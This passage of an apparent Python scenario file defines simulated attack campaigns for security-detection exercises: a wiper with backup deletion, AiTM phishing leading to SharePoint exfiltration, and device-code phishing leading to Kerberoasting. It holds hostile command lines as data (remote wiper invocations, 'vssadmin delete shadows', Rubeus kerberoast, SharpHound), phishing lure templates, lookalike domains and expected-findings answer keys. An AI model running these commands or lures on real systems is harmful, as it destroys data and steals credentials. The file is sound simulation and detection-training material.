        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 25), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Invoke-Command -ComputerName SRV-SQL01 -ScriptBlock { C:\\Windows\\Temp\\maintenance.ps1 -Action PurgeAll }\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 6320, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact", "is_attacker": True, "wiper_target": "SRV-SQL01"}}, requires_success=True),
        # Wiper on SRV-APP01
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Invoke-Command -ComputerName SRV-APP01 -ScriptBlock { C:\\Windows\\Temp\\maintenance.ps1 -Action PurgeAll }\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 6380, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact", "is_attacker": True, "wiper_target": "SRV-APP01"}}, requires_success=True),
        # Wiper on SRV-FILE01
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Invoke-Command -ComputerName SRV-FILE01 -ScriptBlock { C:\\Windows\\Temp\\maintenance.ps1 -Action PurgeAll }\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 6420, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact", "is_attacker": True, "wiper_target": "SRV-FILE01"}}, requires_success=True),

        # --- Phase 9: Cascading service failures ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Monitoring System", "action": "alert_service_down", "resource_type": "service", "resource_name": "SRV-SQL01 — SQL Server Database Engine", "success": False, "description": "Critical: SQL Server Database Engine service failed on SRV-SQL01 — data files destroyed", "metadata": {"attack_phase": "impact", "service_failure": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 5), data={"app": "Monitoring System", "action": "alert_service_down", "resource_type": "service", "resource_name": "SRV-APP01 — IIS Application Pool", "success": False, "description": "Critical: IIS Application Pool crashed on SRV-APP01 — web application files destroyed", "metadata": {"attack_phase": "impact", "service_failure": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 5), data={"app": "Monitoring System", "action": "alert_service_down", "resource_type": "service", "resource_name": "SRV-FILE01 — File Server Resource Manager", "success": False, "description": "Critical: File Server Resource Manager failed on SRV-FILE01 — shared files destroyed", "metadata": {"attack_phase": "impact", "service_failure": True}}, requires_success=True),

        # --- Phase 10: Backup deletion attempts ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "vssadmin.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "vssadmin delete shadows /all /quiet", "path": "C:\\Windows\\System32\\vssadmin.exe", "pid": 6520, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact", "is_attacker": True, "backup_destruction": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Veeam Backup & Replication", "action": "delete_backup_job", "resource_type": "backup_job", "resource_name": "Daily-Backup-All-Servers", "success": True, "description": "Veeam daily backup job deleted — recovery points removed", "metadata": {"attack_phase": "impact", "is_attacker": True, "backup_destruction": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.6,
    iocs=["maintenance.ps1"],
    expected_findings=[
        "ServiceNow change ticket created as cover for destructive operation",
        "Wiper scripts deployed to servers via admin shares",
        "Monitoring alerts muted under maintenance pretext",
        "Wiper executed during maintenance window — cascading service failures",
        "Backups destroyed after wiper — no recovery possible",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)


# =============================================================================
# COMPOUND T3 CAMPAIGNS
# =============================================================================

_COMPOUND_BASE_PARAMS = {
    "attacker_domains": ["login-microsoftonline-sso.com", "auth-office365-verify.net", "microsoft-device-verify.com"],
    "sender_names": ["Microsoft 365 Security", "IT Help Desk", "Microsoft AppSource"],
    "sender_prefixes": ["no-reply", "security", "appsource"],
    "subjects": ["Action Required: Verify Your Identity", "Complete Device Registration", "Authorize new productivity app"],
    "email_bodies": ["Please verify your identity:\n{phishing_url}\n\nMicrosoft Security Team"],
    "phishing_domains": ["login-microsoftonline-sso.com", "auth-office365-verify.net"],
    "evilginx_domains": SHARED_ATTACKER_INFRA["evilginx_domains"],
    **SHARED_ATTACKER_INFRA,
}

AITM_TO_SHAREPOINT_EXFIL = AttackScenario(
    id="aitm_to_sharepoint_exfil",
    tier="T3",
    name="AiTM Phishing to SharePoint Mass Exfiltration",
    description="Attacker sends AiTM phishing email with evilginx reverse proxy. Victim authenticates through proxy including MFA, session cookie is captured. Attacker replays session from foreign IP, registers MFA device for persistence, enumerates M365 tenant and mailbox, creates inbox forwarding rule, hijacks an email thread for lateral phishing, browses multiple SharePoint sites to locate sensitive documents, performs mass download, and exfiltrates data over HTTPS.",
    attack_type="aitm_phishing",
    events=[
        # =====================================================================
        # DAY 1 — Phishing + session capture + MFA persistence + initial recon
        # =====================================================================

        # --- Phase 1: Delivery — phishing email with AiTM proxy link ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),

        # --- Phase 2: Exploitation — victim clicks and authenticates through proxy ---
        AttackEvent(event_type="app_event", delay=_delay(18, 12, 2, 90), data={"app": "Microsoft Edge", "action": "navigate", "resource_name": "{phishing_url}", "success": True, "description": "Victim clicked AiTM proxy link from email", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(8, 4, 1, 30), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported suspicious email", "success": True}}),
        # Victim authenticates normally — proxy captures session cookie
        AttackEvent(event_type="login", delay=_delay(2, 1, 0.5, 5), data={"success": True, "known_device": True, "method": "Password+MFA", "metadata": {"attack_phase": "credential_capture", "session_stolen": True}}, requires_success=True),

        # --- Phase 3: Session replay — attacker uses stolen cookie from foreign IP ---
        AttackEvent(event_type="login", delay=_delay(8, 5, 1, 45), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SessionToken", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "session_replay": True, "impossible_travel": True}}, requires_success=True),

        # --- Phase 4: Persistence — register MFA device before session expires ---
        AttackEvent(event_type="admin_action", delay=_delay(2, 1, 0.3, 6), data={"system": "azure_ad", "approved_by": "self", "action": "register_mfa_device", "resource_type": "authentication_method", "resource_id": "mfa_phone_+1XXXXXXXXX", "resource_name": "Phone Authentication Method", "success": True, "description": "New MFA phone number registered on compromised account", "metadata": {"attack_phase": "persistence", "is_attacker": True, "mfa_manipulation": True}}, requires_success=True),
        AttackEvent(event_type="admin_action", delay=_delay(1, 0.5, 0.2, 3), data={"system": "azure_ad", "approved_by": "self", "action": "register_mfa_device", "resource_type": "authentication_method", "resource_id": "mfa_totp_authenticator", "resource_name": "Microsoft Authenticator", "success": True, "description": "Authenticator app registered on attacker-controlled device", "metadata": {"attack_phase": "persistence", "is_attacker": True, "mfa_manipulation": True}}, requires_success=True),

        # --- Phase 5: Reconnaissance — enumerate tenant, users, mailbox ---
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Microsoft 365 Admin Center", "action": "navigate", "resource_type": "dashboard", "resource_name": "M365 Admin Portal", "success": True, "description": "Attacker browsed M365 admin dashboard", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft 365 Admin Center", "action": "list_users", "resource_type": "directory", "resource_name": "Active Users", "success": True, "description": "Enumerated all active users and assigned roles", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft 365 Admin Center", "action": "list_groups", "resource_type": "directory", "resource_name": "Security Groups", "success": True, "description": "Enumerated security groups and distribution lists", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # Mailbox search — looking for sensitive threads and financial info
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR credentials OR confidential OR wire transfer'", "success": True, "description": "Attacker searched mailbox for sensitive keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_budget_review_thread", "resource_name": "Re: Q3 Budget Review — Final Numbers", "success": True, "description": "Attacker read email thread about Q3 budget", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 4), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_vendor_payment", "resource_name": "Vendor Payment Instructions — Acme Corp", "success": True, "description": "Attacker read vendor payment instructions email", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Attacker returns with registered MFA device: inbox rules,
        #          thread hijack, SharePoint reconnaissance
        # (overnight gap: attacker reviews recon, plans next moves)
        # =====================================================================

        # --- Phase 6: Attacker returns using registered MFA ---
        AttackEvent(event_type="login", delay=_delay(1080, 360, 720, 1800), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password+MFA", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "return_session": True, "mfa_via_registered_device": True}}, requires_success=True),

        # --- Phase 7: Inbox rule + mail forwarding for persistence and defense evasion ---
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_delete", "resource_name": "Auto-Delete Security Alerts", "success": True, "description": "Inbox rule created to auto-delete emails containing 'security alert' or 'unusual sign-in'", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Mailbox forwarding rule created to external address attacker-drop@protonmail.com", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 8: Thread hijack — lateral phishing from compromised mailbox ---
        AttackEvent(event_type="email", delay=_delay(10, 5, 2, 30), data={"direction": "sent", "subject": "Re: Q3 Budget Review — Final Numbers", "content": "Hi team, updated version with corrected figures attached. Please review before EOD:\n{phishing_url}\n\nThanks", "external": False, "contains_url": "{phishing_url}", "metadata": {"attack_phase": "lateral_phishing", "is_attacker": True, "thread_hijack": True}}, requires_success=True),
        AttackEvent(event_type="email", delay=_delay(5, 3, 1, 15), data={"direction": "sent", "subject": "Re: Vendor Payment Instructions — Acme Corp", "content": "Please use the updated payment portal for this quarter's invoices:\n{phishing_url}\n\nBest regards", "external": False, "contains_url": "{phishing_url}", "metadata": {"attack_phase": "lateral_phishing", "is_attacker": True, "thread_hijack": True}}, requires_success=True),

        # --- Phase 9: SharePoint browsing — locate sensitive document libraries ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 25), data={"app": "SharePoint Online", "action": "navigate", "resource_type": "site", "resource_name": "https://company.sharepoint.com/sites/Executive", "success": True, "description": "Attacker browsed Executive SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "SharePoint Online", "action": "list_contents", "resource_type": "document_library", "resource_name": "Executive/Shared Documents/Board Materials", "success": True, "description": "Attacker listed contents of Board Materials library", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "SharePoint Online", "action": "navigate", "resource_type": "site", "resource_name": "https://company.sharepoint.com/sites/Finance", "success": True, "description": "Attacker browsed Finance SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "SharePoint Online", "action": "list_contents", "resource_type": "document_library", "resource_name": "Finance/Shared Documents/Quarterly Reports", "success": True, "description": "Attacker listed contents of Quarterly Reports library", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "SharePoint Online", "action": "navigate", "resource_type": "site", "resource_name": "https://company.sharepoint.com/sites/HR-Confidential", "success": True, "description": "Attacker browsed HR Confidential SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 4), data={"app": "SharePoint Online", "action": "list_contents", "resource_type": "document_library", "resource_name": "HR-Confidential/Shared Documents/Compensation", "success": True, "description": "Attacker listed contents of Compensation library", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Attacker returns for mass download and exfiltration
        # (overnight gap: attacker identified target files on Day 2)
        # =====================================================================

        # --- Phase 10: Attacker returns for mass download ---
        AttackEvent(event_type="login", delay=_delay(1200, 360, 720, 2160), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password+MFA", "metadata": {"attack_phase": "collection", "is_attacker": True, "return_session": True, "mfa_via_registered_device": True}}, requires_success=True),

        # --- Phase 11: Mass file download from SharePoint ---
        AttackEvent(event_type="file_event", delay=_delay(3, 1.5, 0.5, 10), data={"action": "download", "path": "https://company.sharepoint.com/sites/Finance/Shared Documents/Quarterly Reports/Q3-2026-Financial-Summary.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded Q3 financial summary", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "download", "path": "https://company.sharepoint.com/sites/Finance/Shared Documents/Quarterly Reports/Q3-2026-Revenue-Breakdown.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded Q3 revenue breakdown", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "download", "path": "https://company.sharepoint.com/sites/Executive/Shared Documents/Board Materials/Board-Deck-Oct-2026.pptx", "system": "sharepoint", "label": "confidential", "category": "presentation", "description": "Downloaded board presentation", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "download", "path": "https://company.sharepoint.com/sites/Executive/Shared Documents/Board Materials/MA-Target-Analysis-Confidential.pdf", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded M&A target analysis", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "download", "path": "https://company.sharepoint.com/sites/HR-Confidential/Shared Documents/Compensation/2026-Executive-Compensation-Plan.xlsx", "system": "sharepoint", "label": "confidential", "category": "hr", "description": "Downloaded executive compensation plan", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "download", "path": "https://company.sharepoint.com/sites/HR-Confidential/Shared Documents/Compensation/Employee-Stock-Options-Vesting.xlsx", "system": "sharepoint", "label": "confidential", "category": "hr", "description": "Downloaded employee stock options vesting schedule", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "download", "path": "https://company.sharepoint.com/sites/Finance/Shared Documents/Quarterly Reports/Customer-Revenue-Pipeline-2026.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded customer revenue pipeline", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 12: OneDrive access — victim's personal files ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "OneDrive", "action": "navigate", "resource_type": "folder", "resource_name": "OneDrive — Personal/Documents", "success": True, "description": "Attacker browsed victim's OneDrive personal documents", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(1, 0.5, 0.2, 3), data={"action": "download", "path": "https://company-my.sharepoint.com/personal/Documents/Saved Passwords.docx", "system": "onedrive", "label": "personal", "category": "credentials", "description": "Downloaded file named 'Saved Passwords' from OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "download", "path": "https://company-my.sharepoint.com/personal/Documents/VPN-Config-Notes.txt", "system": "onedrive", "label": "personal", "category": "configuration", "description": "Downloaded VPN configuration notes from OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 13: Exfiltration — large outbound transfer ---
        AttackEvent(event_type="network_event", delay=_delay(5, 2, 1, 15), data={"source_ip": "{attacker_ip}", "destination_ip": "104.16.85.20", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 157286400, "bytes_received": 8192, "description": "HTTPS bulk download from SharePoint/OneDrive via Microsoft Graph API — 150 MB transferred to external IP"}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(3, 1.5, 0.5, 8), data={"source_ip": "{attacker_ip}", "destination_ip": "104.16.85.20", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 83886080, "bytes_received": 4096, "description": "HTTPS continued download — additional 80 MB batch of SharePoint documents transferred"}, requires_success=True),
    ],
    parameters=_COMPOUND_BASE_PARAMS,
    success_rate=0.45,
    iocs=["login-microsoftonline-sso.com", "auth-office365-verify.net"],
    expected_findings=[
        "AiTM phishing with session token replay — impossible travel",
        "MFA device registration from attacker session for persistence",
        "Inbox rule and forwarding rule created for defense evasion",
        "Thread hijack — phishing from compromised account in real threads",
        "Mass file download from SharePoint and OneDrive — data exfiltrated",
    ],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "evilginx_domain", "phishing_url", "attacker_ip"],
)

DEVICE_CODE_TO_DCSYNC = AttackScenario(
    id="device_code_to_dcsync",
    tier="T3",
    name="Device-Code Phishing to DCSync Domain Credential Dump",
    description="Attacker sends device-code phishing email. Victim enters code, granting attacker an OAuth token. Attacker replays token from foreign IP, performs cloud recon in M365 admin portal, enumerates users, searches mailbox, registers MFA for persistence. Next day attacker returns, sends Teams lure to colleague who downloads RAT. RAT executes, beacons to C2, runs host discovery and AD enumeration via BloodHound. On day three attacker returns for privilege escalation and DCSync — extracting Administrator, krbtgt, and full domain credentials via DRSUAPI replication, then stages and exfiltrates the credential dump.",
    attack_type="device_code_phishing",
    events=[
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "metadata": {"is_malicious": True, "attack_phase": "delivery", "device_code_phishing": True}}, requires_success=False),
        # --- Phase 2: Exploitation — victim enters device code ---
        AttackEvent(event_type="app_event", delay=_delay(12, 8, 2, 60), data={"app": "Microsoft Edge", "action": "form_submit", "resource_name": "https://microsoft.com/devicelogin", "success": True, "description": "Victim entered device code on Microsoft device login page", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 20), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported email", "success": True}}),
        AttackEvent(event_type="login", delay=_delay(1, 0.5, 0.1, 3), data={"success": True, "known_device": True, "method": "DeviceCode", "metadata": {"attack_phase": "credential_capture", "token_granted": True}}, requires_success=True),

        # --- Phase 3: Token replay — attacker uses captured OAuth token ---
        AttackEvent(event_type="login", delay=_delay(2, 1, 0.2, 8), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "OAuth2Token", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "token_replay": True}}, requires_success=True),

        # --- Phase 4: Cloud reconnaissance — M365 admin portal and user enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Microsoft 365 Admin Center", "action": "navigate", "resource_type": "dashboard", "resource_name": "M365 Admin Portal", "success": True, "description": "Attacker browsed M365 admin dashboard via stolen token", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft 365 Admin Center", "action": "list_users", "resource_type": "directory", "resource_name": "Active Users", "success": True, "description": "Enumerated all active users and their assigned roles", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft 365 Admin Center", "action": "list_groups", "resource_type": "directory", "resource_name": "Security Groups and Admin Roles", "success": True, "description": "Enumerated security groups and admin role assignments", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Mailbox search — looking for credentials and sensitive info ---
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR credentials OR VPN OR admin OR service account'", "success": True, "description": "Attacker searched mailbox for credential-related keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_it_onboarding_creds", "resource_name": "IT Onboarding — Temporary Credentials for New Hire", "success": True, "description": "Attacker read email containing temporary credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: MFA persistence — register device before token expires ---
        AttackEvent(event_type="admin_action", delay=_delay(2, 1, 0.3, 6), data={"system": "azure_ad", "approved_by": "self", "action": "register_mfa_device", "resource_type": "authentication_method", "resource_id": "mfa_totp_authenticator", "resource_name": "Microsoft Authenticator", "success": True, "description": "Attacker registered Authenticator app on controlled device for persistence", "metadata": {"attack_phase": "persistence", "is_attacker": True, "mfa_manipulation": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Return, Teams lure, RAT delivery, host discovery, AD enum
        # =====================================================================

        # --- Phase 7: Attacker returns next day ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "Password+MFA", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "return_session": True, "mfa_via_registered_device": True}}, requires_success=True),

        # --- Phase 8: Teams lure to colleague — RAT delivery ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 40), data={"app": "Microsoft Teams", "action": "send_message", "resource_name": "https://cdn-static-assets.com/tools/diag_v2.exe", "success": True, "description": "Attacker sent Teams message to colleague with RAT link disguised as IT diagnostic tool", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(15, 10, 3, 60), data={"app": "Microsoft Edge", "action": "download", "resource_name": "diag_v2.exe", "success": True, "description": "Colleague downloaded RAT from Teams link", "metadata": {"attack_phase": "delivery"}}, requires_success=True),

        # --- Phase 9: RAT execution and C2 beacon ---
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.3, 8), data={"process_name": "diag_v2.exe", "action": "start", "parent_process": "explorer.exe", "path": "C:\\Users\\Downloads\\diag_v2.exe", "pid": 6148, "integrity_level": "medium", "command_line": "C:\\Users\\Downloads\\diag_v2.exe /silent /install", "hash": "371b7e30e74a48b421bf543a62df991ae10737f6834fe701e3ff14f8e35c1165", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 1024, "bytes_received": 4096, "description": "RAT C2 beacon — initial check-in over HTTPS", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),

        # --- Phase 10: Host discovery via LOLBins ---
        AttackEvent(event_type="process_event", delay=_delay(3, 1.5, 0.5, 10), data={"process_name": "whoami.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 6204, "integrity_level": "medium", "command_line": "whoami /all", "hash": "b0fa0168eedb17cc6dc537a292be176432939c8413c7c10b264a9ec71b9e01a6", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "ipconfig.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Windows\\System32\\ipconfig.exe", "pid": 6220, "integrity_level": "medium", "command_line": "ipconfig /all", "hash": "9cfb88824fe59207339540355c6745b8a1650761b570df615405b1ebccd411c3", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "net.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 6248, "integrity_level": "medium", "command_line": "net group \"Domain Admins\" /domain", "hash": "bea2fe839f38b3c42d40df4e01b8f9ee6acb780aaf89b1a932bebcff1abb9332", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),

        # --- Phase 11: AD enumeration — BloodHound/SharpHound ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "SharpHound.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Users\\Public\\SharpHound.exe", "pid": 6312, "integrity_level": "medium", "command_line": "SharpHound.exe -c All --outputdirectory C:\\Temp\\bh_output", "hash": "1b33988555e7a28cf72c641d91ae158cf59f8b3ca22a157f671cf7c42929021a", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "ad_enumeration": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.3, 8), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 389, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 32768, "bytes_received": 2097152, "description": "SharpHound LDAP queries against domain controller — large data return indicates full AD graph collection", "metadata": {"attack_phase": "discovery", "ad_enumeration": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Return, privilege escalation, DCSync, credential staging/exfil
        # =====================================================================

        # --- Phase 12: Attacker returns for privilege escalation ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "Password+MFA", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "return_session": True, "mfa_via_registered_device": True}}, requires_success=True),

        # --- Phase 13: Privilege escalation — Kerberoast ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "Rubeus.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Users\\Public\\Rubeus.exe", "pid": 7104, "integrity_level": "medium", "command_line": "Rubeus.exe kerberoast /outfile:C:\\Temp\\kerberoast_hashes.txt", "hash": "8a68883f2110f77dd30b4291250b85ce11e558bb6932c3b2f4a2ab75b8862a24", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "privilege_escalation", "kerberoasting": True}}, requires_success=True),

        # --- Phase 14: DCSync — targeted credential extraction ---
